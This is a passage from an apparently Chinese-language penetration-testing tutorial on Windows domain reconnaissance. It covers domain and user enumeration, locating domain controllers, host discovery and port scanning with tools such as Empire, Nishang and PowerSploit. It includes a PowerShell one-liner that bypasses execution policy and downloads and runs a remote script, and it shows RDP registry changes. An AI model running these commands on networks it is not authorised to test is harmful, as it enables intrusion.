class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1 </span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f </span><br></pre></td></tr></table></figure><h2 id="2-2-自动收集信息"><a href="#2-2-自动收集信息" class="headerlink" title="2.2 自动收集信息"></a>2.2 自动收集信息</h2><p>使用<code>WMIC</code>自动脚本来收集信息,打开运行 <code>wmic_info.bat</code>  会自动生成一个 <code>out.html</code> 文件</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1630.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1631.png" alt="图片"></p><h3 id="Empire下的主机信息搜集"><a href="#Empire下的主机信息搜集" class="headerlink" title="Empire下的主机信息搜集"></a>Empire下的主机信息搜集</h3><p>Empirer提供了收集主机的模块。</p><p>下载地址：<a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><h3 id="1、查看当前权限"><a href="#1、查看当前权限" class="headerlink" title="1、查看当前权限"></a>1、查看当前权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>本地管理员用户，或者是本地用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1632.png" alt="图片"></p><p>域内用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1633.png" alt="图片"></p><p>在以上三种情况下，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息；而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号密码。</p><h3 id="2、获取域SID"><a href="#2、获取域SID" class="headerlink" title="2、获取域SID"></a>2、获取域SID</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1634.png" alt="图片"></p><p>当前域 <code>hacker</code> 的 <code>SID</code> 为：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1635.png" alt="图片"></p><h3 id="3、查询指定用户的详细信息"><a href="#3、查询指定用户的详细信息" class="headerlink" title="3、查询指定用户的详细信息"></a>3、查询指定用户的详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1636.png" alt="图片"></p><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><h3 id="1、使用ipconfig命令"><a href="#1、使用ipconfig命令" class="headerlink" title="1、使用ipconfig命令"></a>1、使用ipconfig命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1637.png" alt="图片"></p><p>然后可以使用反向解析查询命令 <code>nslookup</code> 来解析域名的IP地址。用解析到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nclookup hacker.lab</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1638.png" alt="图片"></p><h3 id="2、查看系统详细配置"><a href="#2、查看系统详细配置" class="headerlink" title="2、查看系统详细配置"></a>2、查看系统详细配置</h3><p>使用 <code>systeminfo</code> 命令，如果存在域就会显示：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1639.png" alt="图片"></p><p>如果不存在就会显示一个：<code>WORKGROUP</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1640.png" alt="图片"></p><h3 id="3、查询当前登录域及登录用户信息"><a href="#3、查询当前登录域及登录用户信息" class="headerlink" title="3、查询当前登录域及登录用户信息"></a>3、查询当前登录域及登录用户信息</h3><p>执行命令如果存在域那么就会显示工作站域和工作站域DNS等信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1641.png" alt="图片"></p><p>执行命令如果不存在域那么就会显示<code>WORKGROUP</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1642.png" alt="图片"></p><h3 id="4、判断主域"><a href="#4、判断主域" class="headerlink" title="4、判断主域"></a>4、判断主域</h3><p>判断主域：域服务器通常会同时作为时间服务器使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>有三种情况，第一种中存在域，当前是域用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1643.png" alt="图片"></p><p>第二种是，不存在域，环境是工作组：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1644.png" alt="图片"></p><p>第三种是，存在域，但是当前用户不是域用户</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1645.png" alt="图片"></p><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><h3 id="1、使用nbtscan"><a href="#1、使用nbtscan" class="headerlink" title="1、使用nbtscan"></a>1、使用nbtscan</h3><p>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。</p><p>NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</p><p>使用命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 10.10.10.0/20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1646.png" alt="图片"></p><p>第一列为IP地址，第二列为机器名和所在域的名称，第三列是机器所开启的服务列表。</p><p>服务列表具体含义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Token：含义：</span><br><span class="line">SHARING 该机器中存在运行的文件和打印共享服务，但不一定有内容共享</span><br><span class="line">DC 该机器可能是域控制器</span><br><span class="line">U=USER 该机器中有登陆名为User的用户（不太准确）</span><br><span class="line">IIS 该机器中可能安装了IIS服务</span><br><span class="line">EXCHANGE 该机器中可能安装了Exchane</span><br><span class="line">NOTES 该机器中可能安装了Lotus Notes电子邮箱客户端</span><br><span class="line">？ 没有识别出机器的NetBIOS资源（可以使用 -F 选项再次扫描）</span><br></pre></td></tr></table></figure><h3 id="2、利用ICMP协议快速探测内网"><a href="#2、利用ICMP协议快速探测内网" class="headerlink" title="2、利用ICMP协议快速探测内网"></a>2、利用ICMP协议快速探测内网</h3><p>除了使用NetBIOS探测内网，还可以使用ICMP协议去探测内网情况。</p><p>使用ping命令，依次对内网中的每个IP地址执行Ping命令，可以快速找出内网中所有存活的主机（比较慢）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1647.png" alt="图片"></p><p>还可以使用VBS脚本进行探测，脚本源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = &quot;10.10.10.&quot; </span><br><span class="line">Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;) </span><br><span class="line">Set objTS = objfso.CreateTextFile(&quot;C:\Windows\Temp\Result.txt&quot;) </span><br><span class="line">For i = 1 To 254</span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line">If blnResult = True Then </span><br><span class="line">objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot; </span><br><span class="line">End If</span><br><span class="line">Next </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo &quot;All Ping Scan , All Done ! :) &quot; </span><br><span class="line">Function Ping(strComputer) </span><br><span class="line">Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) </span><br><span class="line">Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot; &amp; strComputer &amp; &quot;&#x27;&quot;) </span><br><span class="line">For Each objItem In colItems </span><br><span class="line">Select case objItem.StatusCode </span><br><span class="line">Case 0 </span><br><span class="line">Ping = True </span><br><span class="line">Case Else </span><br><span class="line">Ping = False </span><br><span class="line">End select </span><br><span class="line">Exit For </span><br><span class="line">Next </span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>运行命令：cscript 1.vbs（速度很慢）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1648.png" alt="图片"></p><p>运行完后它会把结果保存到<code>C:\Windows\Temp\Result.txt</code> 中：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1649.png" alt="图片"></p><h3 id="3、通过ARP扫描探测内网"><a href="#3、通过ARP扫描探测内网" class="headerlink" title="3、通过ARP扫描探测内网"></a>3、通过ARP扫描探测内网</h3><h4 id="3-1：apr-scan工具"><a href="#3-1：apr-scan工具" class="headerlink" title="3.1：apr-scan工具"></a>3.1：apr-scan工具</h4><p>把arp-scan工具上传到目标主机上，可以自定义子网掩码，指定扫描范围，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1650.png" alt="图片"></p><h4 id="3-2-Empire中的arpscan模块"><a href="#3-2-Empire中的arpscan模块" class="headerlink" title="3.2:Empire中的arpscan模块"></a>3.2:Empire中的arpscan模块</h4><p>下载地址：<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>PS：在这里安装Empire需要更改一下格式：<a href="https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html">https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html</a></p><p>Empire中内置了arpscan的模块，这个模块可以在局域网内发送ARP数据包，搜集活跃主机的IP地址、MAC地址信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1651.png" alt="图片"></p><h4 id="3-3：Nishang中的Invoke-ARPScan-ps1脚本"><a href="#3-3：Nishang中的Invoke-ARPScan-ps1脚本" class="headerlink" title="3.3：Nishang中的Invoke-ARPScan.ps1脚本"></a>3.3：Nishang中的Invoke-ARPScan.ps1脚本</h4><p>使用 Nishang 中的 Invoke-ARPScan.ps1 脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行、自定义掩码和扫描范围，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot; &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1652.png" alt="图片"></p><h3 id="4、通过常规TCP-UDP端口扫描探测内网"><a href="#4、通过常规TCP-UDP端口扫描探测内网" class="headerlink" title="4、通过常规TCP/UDP端口扫描探测内网"></a>4、通过常规TCP/UDP端口扫描探测内网</h3><p>ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1653.png" alt="图片"></p><h2 id="2-6-扫描域内端口"><a href="#2-6-扫描域内端口" class="headerlink" title="2.6 扫描域内端口"></a>2.6 扫描域内端口</h2><p>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注以下三点。</p><ul><li>端口的 Banner 信息。</li><li>端口上运行的服务。</li><li>常见应用的默认端口</li></ul><h3 id="1：利用Telnet命令进行扫描"><a href="#1：利用Telnet命令进行扫描" class="headerlink" title="1：利用Telnet命令进行扫描"></a>1：利用Telnet命令进行扫描</h3><p>Telnet协议是<code>TCP/IP</code>协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。</p><p>在目标主机上使用telnet协议，可以与目标服务器建立连接。如果只是想快速探测某太主机的某个常规高危端口是否开放，使用telnet命令就可以做到！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 端口</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1654.png" alt="图片"></p><h3 id="2：使用S扫描器"><a href="#2：使用S扫描器" class="headerlink" title="2：使用S扫描器"></a>2：使用S扫描器</h3><p>S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1655.png" alt="图片"></p><h3 id="3：使用Metasploit端口扫描"><a href="#3：使用Metasploit端口扫描" class="headerlink" title="3：使用Metasploit端口扫描"></a>3：使用Metasploit端口扫描</h3><p>MSF这里就不多介绍了，我博客 <a href="http://www.saulgoodman.cn/">www.saulGoodman.cn</a> 里面讲了MSF的使用，端口扫描使用这个模块 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp：</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1656.png" alt="图片"></p><h3 id="4：使用PowerScript的Invoke-portscan-ps1脚本"><a href="#4：使用PowerScript的Invoke-portscan-ps1脚本" class="headerlink" title="4：使用PowerScript的Invoke-portscan.ps1脚本"></a>4：使用PowerScript的Invoke-portscan.ps1脚本</h3><p>以无文件形式扫描，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\windows\temp\res.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1657.png" alt="图片"></p><p>使用还是挺不错的，速度挺快。</p><h3 id="5：使用Nishang的Invoke-PortScan模块"><a href="#5：使用Nishang的Invoke-PortScan模块" class="headerlink" title="5：使用Nishang的Invoke-PortScan模块"></a>5：使用Nishang的Invoke-PortScan模块</h3><p>Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">具体的参数介绍如下。 </span><br><span class="line">StartAddress：扫描范围开始的地址。 </span><br><span class="line">EndAddress：扫描范围结束的地址。 </span><br><span class="line">ScanPort：进行端口扫描。 </span><br><span class="line">Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、</span><br><span class="line">111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、</span><br><span class="line">7878、8080、1521、3306、3389、5801、5900、5555、5901。 </span><br><span class="line">TimeOut：设置超时时间。</span><br><span class="line">使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1658.png" alt="图片"></p><h3 id="6：端口Bannner信息"><a href="#6：端口Bannner信息" class="headerlink" title="6：端口Bannner信息"></a>6：端口Bannner信息</h3><p>如果发现了端口，但是不确定这个端口是什么服务，就可以利用一些nc来获取这个端口的banner信息，就好比这样 ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1659.png" alt="图片"></p><h2 id="2-7-搜集域内基础信息"><a href="#2-7-搜集域内基础信息" class="headerlink" title="2.7 搜集域内基础信息"></a>2.7 搜集域内基础信息</h2><p>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。</p><p>因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。</p><h3 id="1：查询域"><a href="#1：查询域" class="headerlink" title="1：查询域"></a>1：查询域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1660.png" alt="图片"></p><p>这里有个坑，有时候查询出错6118错误，是因为 Computer Brower 服务的问题，把它手动启动。</p><h3 id="2：查询域内所有计算机"><a href="#2：查询域内所有计算机" class="headerlink" title="2：查询域内所有计算机"></a>2：查询域内所有计算机</h3><p>执行以下命令就可以查询得到主机名对主机角色进行初步判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:HACKER[主机名]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1661.png" alt="图片"></p><h3 id="3：查询域内所有用户组列表"><a href="#3：查询域内所有用户组列表" class="headerlink" title="3：查询域内所有用户组列表"></a>3：查询域内所有用户组列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1662.png" alt="图片"></p><h3 id="4：查询所有域成员计算机列表"><a href="#4：查询所有域成员计算机列表" class="headerlink" title="4：查询所有域成员计算机列表"></a>4：查询所有域成员计算机列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1663.png" alt="图片"></p><h3 id="5：获取域密码信息"><a href="#5：获取域密码信息" class="headerlink" title="5：获取域密码信息"></a>5：获取域密码信息</h3><p>获取域密码策略、密码长度、错误锁定等信息用这条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1664.png" alt="图片"></p><h3 id="6：获取域信任信息"><a href="#6：获取域信任信息" class="headerlink" title="6：获取域信任信息"></a>6：获取域信任信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1665.png" alt="图片"></p><h2 id="2-8-查找域控制器"><a href="#2-8-查找域控制器" class="headerlink" title="2.8 查找域控制器"></a>2.8 查找域控制器</h2><h3 id="1：查看域控制器的机器名"><a href="#1：查看域控制器的机器名" class="headerlink" title="1：查看域控制器的机器名"></a>1：查看域控制器的机器名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:主机名[Hacker]</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1666.png" alt="图片"></p><h3 id="2：查看域控制器主机名"><a href="#2：查看域控制器主机名" class="headerlink" title="2：查看域控制器主机名"></a>2：查看域控制器主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1667.png" alt="图片"></p><h3 id="3：查看当前时间"><a href="#3：查看当前时间" class="headerlink" title="3：查看当前时间"></a>3：查看当前时间</h3><p>在通常情况下，时间服务器为主域控制器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1668.png" alt="图片"></p><h3 id="4：查看域控制器组"><a href="#4：查看域控制器组" class="headerlink" title="4：查看域控制器组"></a>4：查看域控制器组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1669.png" alt="图片"></p><p>PS：在实际情况中，一个域内一般有两台或者两台以上的域控制器，因为一点主域控制器发生故障，备用域控制器就可以保证域内服务和验证工作正常运行。</p><p>执行以下命令查看主域控制器为DC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1670.png" alt="图片"></p><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><h3 id="1：查询所有域用户列表"><a href="#1：查询所有域用户列表" class="headerlink" title="1：查询所有域用户列表"></a>1：查询所有域用户列表</h3><h4 id="1-1：向域控制器进行查询"><a href="#1-1：向域控制器进行查询" class="headerlink" title="1.1：向域控制器进行查询"></a>1.1：向域控制器进行查询</h4><p>执行以下命令，向域控制器DC查询，域内有5个用户，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1671.png" alt="图片"></p><h4 id="1-2：获取域内用户的详细信息"><a href="#1-2：获取域内用户的详细信息" class="headerlink" title="1.2：获取域内用户的详细信息"></a>1.2：获取域内用户的详细信息</h4><p>执行下面的命令可以获取域内用户的详细信息：用户名、描述信息、SID、域名等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1672.png" alt="图片"></p><h4 id="1-3：查看存在的用户"><a href="#1-3：查看存在的用户" class="headerlink" title="1.3：查看存在的用户"></a>1.3：查看存在的用户</h4><p>执行以下命令会发现有五个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1673.png" alt="图片"></p><p>关于 dsquery 命令还有如下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1674.png" alt="图片"></p><h4 id="1-4：查询本地管理员组用户"><a href="#1-4：查询本地管理员组用户" class="headerlink" title="1.4：查询本地管理员组用户"></a>1.4：查询本地管理员组用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1675.png" alt="图片"></p><p>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p><h3 id="2：查询域管理员用户组"><a href="#2：查询域管理员用户组" class="headerlink" title="2：查询域管理员用户组"></a>2：查询域管理员用户组</h3><h4 id="2-1：查询域管理员用户"><a href="#2-1：查询域管理员用户" class="headerlink" title="2.1：查询域管理员用户"></a>2.1：查询域管理员用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1676.png" alt="图片"></p><h4 id="2-2：查询域管理员用户组"><a href="#2-2：查询域管理员用户组" class="headerlink" title="2.2：查询域管理员用户组"></a>2.2：查询域管理员用户组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1677.png" alt="图片"></p><h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><h3 id="1：域管理员定位概述"><a href="#1：域管理员定位概述" class="headerlink" title="1：域管理员定位概述"></a>1：域管理员定位概述</h3><p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。</p><p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。在通常的网络环境里，内网中部署了大量的网络安全设备，如 